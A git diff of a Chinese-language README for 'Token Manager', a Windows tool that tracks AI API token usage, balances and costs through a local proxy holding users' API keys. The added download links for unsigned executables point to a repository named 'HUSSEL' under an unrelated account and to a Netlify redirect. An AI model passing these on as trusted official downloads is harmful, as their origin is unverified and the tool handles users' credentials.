@@ -1,161 +1,162 @@
-# Token Manager
+<p align="center">
+  <img src="./assets/readme/hero.svg" width="100%" alt="Token Manager v0.11.0：Windows 本地 AI Token、请求、缓存、余额与成本控制中心">
+</p>
 
-> Windows 10/11 本地 AI Token、API 请求、余额与消费监控工具。
+<p align="center">
+  <a href="https://fatimabentz691-max.github.io/HUSSEL/">官方网站</a> ·
+  <a href="https://github.com/fatimabentz691-max/HUSSEL/releases/tag/v0.11.0">GitHub Release</a> ·
+  <a href="https://token-manager-cloud.netlify.app/v1/download/latest?source=github-readme">下载安装包</a> ·
+  <a href="https://github.com/fatimabentz691-max/HUSSEL/releases/download/v0.11.0/TokenManager_0.11.0_x64-portable.exe">下载便携版</a> ·
+  <a href="./docs/USER_GUIDE.md">使用手册</a>
+</p>
 
-Token Manager 面向同时使用 Codex、DeepSeek、Claude、Gemini 和国内开放平台的开发者。它把 Codex 本地日志与各类模型 API 的 `usage` 数据统一保存到本机，在一个中文桌面仪表盘中展示 Token、请求次数、缓存命中、成本和余额状态。
+<p align="center">
+  <strong>Windows 10/11 x64</strong> · Tauri 2 · Vue 3 · Rust · SQLite · Windows DPAPI
+</p>
 
-![Token Manager 模型仪表盘](screenshots/improved-dashboard-final.png)
+Token Manager 是面向 AI 开发者的本地用量控制中心。它把 Codex、Claude Code、本机 API 代理、官方余额接口与账单导入统一为可核对的 Token、请求、缓存、余额和人民币成本数据，并明确标注每项数据究竟来自客户端、本地观测、官方接口还是个人预算估算。
 
-## 当前版本
+## 先看真实界面
 
-- 版本：`0.2.0`
-- 系统：Windows 10/11 x64
-- 桌面框架：Tauri 2 + Rust
-- 前端：Vue 3 + TypeScript
-- 存储：SQLite + Windows DPAPI
-- 网络：国产平台按其官方网络环境直连；海外平台能否访问取决于用户网络和账户权限
+<p align="center">
+  <img src="./assets/readme/dashboard-v0104.png" width="100%" alt="Token Manager v0.10.4 原生黑白模型用量仪表盘">
+</p>
 
-前往仓库的 **Releases** 页面下载 `TokenManager_0.2.0_x64-setup.exe`。首次发布前，安装包可能尚未经过商业代码签名，Windows SmartScreen 可能显示未知发布者。
+这不是静态演示数据页面。代理请求完成后会立即推送用量更新，普通日志、账户余额和模型统计每 30 秒同步；没有真实记录的图表会显示空状态，不会填充模拟数字。
 
-## 主要功能
+## v0.11.0 能做什么
 
-### Codex 本地监控
+- **Codex 专属监控**：读取客户端本地 `rate_limits`、5 小时/7 天窗口、重置时间和本地 Token 记录，不读取或复用 `auth.json`。
+- **Claude Code 专属仪表盘**：从本地 JSONL 提取模型、时间与 `usage` 元数据，不保存提示词或回复正文。
+- **全平台本机代理**：统一记录输入、输出、缓存 Token、请求次数、HTTP 状态和成本；OpenAI、Anthropic、Gemini、DeepSeek 与 OpenAI 兼容格式已进入标准化链路。
+- **独立模型仪表盘**：每个平台、账户和模型只显示自己的数据，支持今日/7 天/30 天图表、鼠标悬停明细和卡片拖动布局。
+- **DeepSeek V4 PRO 深度统计**：流式 `usage`、模型别名归档、人民币计价、官方 `/user/balance` 余额及余额变化记录。
+- **常驻悬浮窗**：恢复 v0.8.5 双形态布局，支持拖动、缩放、置顶、折叠、模型切换与迷你图表；v0.10.4 起永久保持交互，并使用 Windows 原生区域精确裁切圆角。
+- **报告中心**：按全部模型或单个平台/模型生成真正的 `.xlsx` 工作簿。
+- **Arena 排行榜**：展示公开榜单日期、排名、置信信息和六维分类位置；离线时使用最近缓存并明确标注。
+- **本地资产与迁移**：API Key 使用当前 Windows 用户的 DPAPI 加密，可单条删除、批量清空或导出加密迁移包。
+- **可选云账户**：邮箱密码、邮箱验证码与一次性加密迁移链接均为可选能力；核心监控无需登录即可使用。
 
-- 只读访问当前 Windows 用户的 Codex 本地状态库和日志数据库；
-- 展示累计 Token、活跃会话、每日 Turn 和 7 天趋势；
-- 使用用户自定义预算计算 5 小时、7 天滚动剩余比例；
-- 区分全新生成、修改调试和问答解释；
-- 20% / 10% 两档 Windows 通知；
-- 不读取或保存提示词、回复正文。
+<p align="center">
+  <img src="./assets/readme/workflow.svg" width="100%" alt="Token Manager 从本地日志、API 代理、官方余额和账单导入到仪表盘、悬浮窗、预警和 Excel 的本地数据链路">
+</p>
 
-> [!IMPORTANT]
-> Codex Plus 没有向本工具提供官方会员余额接口。页面中的剩余百分比和重置时间来自本地日志与用户预算模拟，只能作为用量参考，不能当作 OpenAI 官方余额。
+## 数据边界：余额就是余额，估算就是估算
 
-### 全平台 API 实时监控
+| 数据 | v0.11.0 的显示规则 |
+| --- | --- |
+| Codex 5 小时 / 7 天额度 | 优先显示客户端落盘的 `rate_limits` 百分比与重置时间；客户端没有下发的窗口明确标为“个人预算估算” |
+| DeepSeek 余额 | 使用已验证的官方 `/user/balance` 返回值，区分总余额、充值余额与赠送余额 |
+| API Token / 请求 / 缓存 | 仅在调用经过本机代理且上游实际返回 `usage` 时记录；失败请求仍可计入请求次数 |
+| OpenAI / Anthropic / Gemini 账单 | 普通模型 API Key 不会被冒充为组织账单权限；缺少官方权限时只显示本机代理统计 |
+| 国产云平台账单 | 根据平台能力使用本机代理、官方账单接口或账单导入；未核实接口时不伪造实时余额 |
+| Arena 排名 | 使用公开结构化榜单与本地缓存，不根据 Token Manager 本机用量自行改写官方名次 |
 
-- 一个账户对应一个本机代理地址，仅监听 `127.0.0.1`；
-- 记录平台、模型、时间、HTTP 状态、输入/输出/缓存 Token 和成本；
-- 不保存 Authorization、请求正文、响应正文或工具调用参数；
-- 全部模型提供 7/30 天彩色 Token 柱状图；
-- 每个模型可建立独立仪表盘，不混入其他模型或 Codex 数据；
-- 支持多账户、模型发现、请求统计、CSV 账单导出和加密迁移。
+完整说明见 [数据来源与准确性](./docs/DATA_SOURCES.md)。
 
-### 悬浮窗与托盘
+## 模型仪表盘、Arena 与悬浮窗
 
-- 可拖动、置顶、缩放和折叠；
-- 卡片网格与单列模式；
-- 可勾选模块并拖动排序；
-- 可切换全部模型、Codex 和单模型仪表盘；
-- 配置、窗口尺寸和模块顺序均保存在本机。
+<p align="center">
+  <img src="./assets/readme/deepseek-v0104.png" width="100%" alt="DeepSeek V4 PRO 独立仪表盘、Token 图表与官方余额变化">
+</p>
+
+<p align="center">
+  <img src="./assets/readme/arena-v0104.png" width="100%" alt="Arena 模型排行榜与六维能力位置图">
+</p>
+
+<table>
+  <tr>
+    <td width="50%" align="center"><img src="./assets/readme/floating-capsule-v0104.png" width="100%" alt="Token Manager 折叠胶囊悬浮窗"></td>
+    <td width="50%" align="center"><img src="./assets/readme/floating-compact-v0104.png" width="100%" alt="Token Manager 展开悬浮窗与七天 Token 图表"></td>
+  </tr>
+  <tr>
+    <td align="center"><strong>折叠胶囊</strong><br>当前模型、Token 与环形指标</td>
+    <td align="center"><strong>经典展开</strong><br>模型切换、摘要、图表与链路状态</td>
+  </tr>
+</table>
 
 ## 支持的平台
 
-| 平台 | 代理 Token 统计 | 模型发现 | 官方余额/账单 |
-| --- | :---: | :---: | --- |
-| Codex | 本地日志 | 自动识别 | 本地预算估算，不冒充官方余额 |
-| DeepSeek | 已验证 | 支持 | 已验证 `/user/balance` 人民币余额 |
-| OpenAI / OpenAI 兼容 | 已验证 | 视上游而定 | 普通模型 Key 不等同组织账单权限 |
-| Anthropic Claude | 已验证 | 内置目录 | 需独立组织账单权限 |
-| Google Gemini | 已验证 | 内置目录 | Cloud Billing 需独立 IAM |
-| 腾讯混元、豆包、文心千帆、通义百炼、智谱、Kimi、MiMo、讯飞星火、MiniMax、阶跃星辰、零一万物、商汤日日新、百川 | OpenAI 兼容响应可统计 | 官方接口或内置目录 | 依平台 AK/SK、签名、账单权限或账单导入能力 |
+客户端日志：**Codex、Claude Code、Cursor**。
 
-平台可添加并不代表普通模型 API Key 一定能查询账户账单。详情见 [数据来源说明](docs/DATA_SOURCES.md)。
+开放平台：**腾讯混元、豆包、文心千帆、通义百炼、智谱 AI、DeepSeek、Kimi、小米 MiMo、讯飞星火、MiniMax、阶跃星辰、零一万物、商汤日日新、百川智能、OpenAI、Anthropic、Google Gemini**，以及自定义 OpenAI 兼容服务。
 
-## 三分钟开始使用
+“可以添加平台”不代表普通模型 API Key 一定拥有官方余额或账单权限。界面会为每个账户标明当前数据来源与可用能力。
 
-1. 安装并启动 Token Manager。
-2. 打开“账户与模型”，选择平台并点击“添加账户”。
-3. 填写账户名称、官方 Base URL 和 API Key；Key 会由 Windows DPAPI 加密。
-4. 点击页面右上角“一键开启 API 实时监控”。
-5. 将调用工具的 Base URL 改成应用显示的 `http://127.0.0.1:<端口>/v1`。
-6. 发起一次真实请求，再回到仪表盘同步数据。
+## 下载 v0.11.0
 
-完整步骤见 [用户使用手册](docs/USER_GUIDE.md) 和 [安装说明](docs/INSTALLATION.md)。
+| 文件 | 用途 | 大小 | SHA-256 |
+| --- | --- | ---: | --- |
+| [`TokenManager_0.11.0_x64-setup.exe`](https://token-manager-cloud.netlify.app/v1/download/latest?source=github-readme) | 推荐，Windows 安装包 | 10.33 MiB | `B8B35DECC09BEE9AFC6A8408661E9AF5EE1B4A784D4FBFD04B703ABC3153F5BE` |
+| [`TokenManager_0.11.0_x64-portable.exe`](https://github.com/fatimabentz691-max/HUSSEL/releases/download/v0.11.0/TokenManager_0.11.0_x64-portable.exe) | 便携运行 | 22.93 MiB | `C4EBA13C9DD824C0DD6EC20AB3E7C1D68384DC7220B779FEDB806085F9097F5C` |
 
-## 数据与隐私
+> [!WARNING]
+> v0.11.0 已配置 Tauri 更新签名，但尚未配置商业 Authenticode 证书，因此 Windows 仍可能显示“未知发布者”。请只从本仓库 Release 或官方网站下载并核对 SHA-256。覆盖安装前先从托盘彻底退出旧版 Token Manager，避免安装程序无法写入正在运行的 EXE。
 
-- 默认零遥测、零云端账户、零密钥上传；
-- API Key 由 Windows DPAPI 绑定当前用户加密；
-- SQLite 数据默认位于 `%LOCALAPPDATA%\\Token Manager\\token-manager.db`；
-- 本地代理拒绝局域网访问；
-- 备份文件使用用户设置的迁移密码加密；
-- 官方余额查询仅访问对应厂商官方 API。
+### 三分钟接入 API 代理
 
-详见 [安全与日志说明](docs/logs-and-security.md) 与 [安全策略](SECURITY.md)。
+1. 在“账户与模型”中选择平台，填写账户名称、官方 Base URL 与 API Key。
+2. 点击“一键开启 API 实时监控”，复制软件分配的 `http://127.0.0.1:<端口>/v1` 地址。
+3. 把调用工具的 Base URL 改为该本机地址；API Key 仍由 Token Manager 使用 DPAPI 加密保存。
+4. 发起一次真实请求。请求结束后 Token、请求次数、缓存与成本会立即写入仪表盘。
 
-## 本地开发
+## 隐私与本地存储
 
-### 环境要求
+- 默认不上传 API Key、会话正文、提示词、回复、工具参数或本地日志正文。
+- API Key 使用 Windows DPAPI 绑定当前用户加密，数据库位于 `%LOCALAPPDATA%\Token Manager\token-manager.db`。
+- 本地代理只监听 `127.0.0.1`，不向局域网开放。
+- 可选账户后端只用于登录与加密迁移，不是使用本地监控的前置条件。
+- 导出的诊断与迁移数据由用户主动触发；迁移包使用用户设置的密码再次加密。
 
-- Node.js 20 LTS
-- Rust stable，目标工具链 `x86_64-pc-windows-msvc`
-- Visual Studio 2022“使用 C++ 的桌面开发”工作负载
-- Windows WebView2 Runtime
+## 从源码运行
 
-### 开发命令
+要求：Node.js 20+、Rust stable、Visual Studio 2022“使用 C++ 的桌面开发”、WebView2 Runtime。
 
 ```powershell
 npm install
 npm run dev
 ```
 
-启动完整桌面端：
+启动完整 Tauri 桌面端：
 
 ```powershell
 npm exec tauri dev
 ```
 
-运行检查：
+验证并生成 NSIS 安装包：
 
 ```powershell
 npm run build
 cargo test --manifest-path src-tauri/Cargo.toml
-```
-
-生成 NSIS 安装包：
-
-```powershell
 npm exec tauri build
 ```
 
-输出目录：`src-tauri/target/release/bundle/nsis/`。
+v0.11.0 已通过 Vue 生产构建、17 项 Rust 单元测试、旧库迁移与去重测试、OpenCode 已知/未知 SQLite 结构测试，以及主程序与 Admin NSIS 构建。
 
 ## 项目结构
 
 ```text
-src/                         Vue 界面、仪表盘与悬浮窗
-src/components/              通用组件和官方平台标志
-src/features/                Codex 留存分析与本地换算
-src-tauri/src/               Rust 数据库、DPAPI、代理、通知与托盘
-docs/                        安装、使用、数据来源与扩展文档
-screenshots/                 产品截图
-.github/workflows/           Windows CI 与 Release 构建
+src/                  Vue 3 主界面、图表、报告、Arena 与悬浮窗
+src/features/         主题、图表、动画、悬浮窗与云端配置
+src-tauri/src/        Rust 数据库、DPAPI、代理、日志解析、Excel 与托盘
+docs/                 安装、使用、数据来源、安全与扩展文档
+assets/readme/        README 的 SVG 视觉系统与真实 v0.10.4 截图
+website/              产品官网源代码
 ```
 
 ## 文档
 
-- [安装与卸载](docs/INSTALLATION.md)
-- [普通用户使用手册](docs/USER_GUIDE.md)
-- [数据来源和准确性](docs/DATA_SOURCES.md)
-- [日志与密钥安全](docs/logs-and-security.md)
-- [新增平台适配器规范](docs/adapter-development.md)
-- [Codex 留存功能说明](docs/codex-retention-features.md)
-- [官方 Logo 来源](docs/provider-logo-sources.md)
-- [更新记录](CHANGELOG.md)
-- [参与贡献](CONTRIBUTING.md)
+- [安装与卸载](./docs/INSTALLATION.md)
+- [普通用户使用手册](./docs/USER_GUIDE.md)
+- [数据来源与准确性](./docs/DATA_SOURCES.md)
+- [日志与密钥安全](./docs/logs-and-security.md)
+- [新增平台适配器规范](./docs/adapter-development.md)
+- [悬浮窗内部架构](./docs/FLOATING_WINDOW_V3.md)
+- [更新记录](./CHANGELOG.md)
+- [参与贡献](./CONTRIBUTING.md)
 
-## 已知限制
+## 商标、许可与关联声明
 
-- Codex 会员剩余额度无法通过官方接口读取，目前为本地观测估算；
-- 仅 DeepSeek 普通 API Key 的人民币余额接口已在当前版本中完成验证；
-- 其他云平台的官方账单通常需要 AK/SK、签名、地域及账单权限，当前不会伪造实时余额；
-- 账单导出当前为 UTF-8 CSV，可直接使用 Excel 打开；
-- 正式大规模分发前仍应配置 Windows 代码签名证书。
+Token Manager 是独立的第三方本地工具，与 README 中提及的平台不存在隶属、合作或官方背书关系。平台名称与标志仅用于识别用户自行配置的服务，权利归各自所有者。
 
-## 商标与关联声明
-
-Token Manager 是独立的第三方本地工具，与 OpenAI、Anthropic、Google、DeepSeek、腾讯、字节跳动、百度、阿里云、智谱、小米、月之暗面、讯飞、MiniMax、阶跃星辰、零一万物、商汤或百川不存在隶属、合作或官方背书关系。平台名称和标志仅用于准确识别用户自行配置的服务，权利归各自所有者。
-
-## 许可证
-
-本仓库暂未附加开源许可证。在仓库所有者明确选择许可证前，默认保留全部权利；公开源码不等于自动授权复制、修改或再分发。
+Token Manager 桌面客户端源码采用 [MIT License](./LICENSE) 开源。你可以使用、修改与再分发代码，但供应商 Logo、产品名称与第三方商标仍归各自权利人所有，使用时请遵守对应品牌规范。
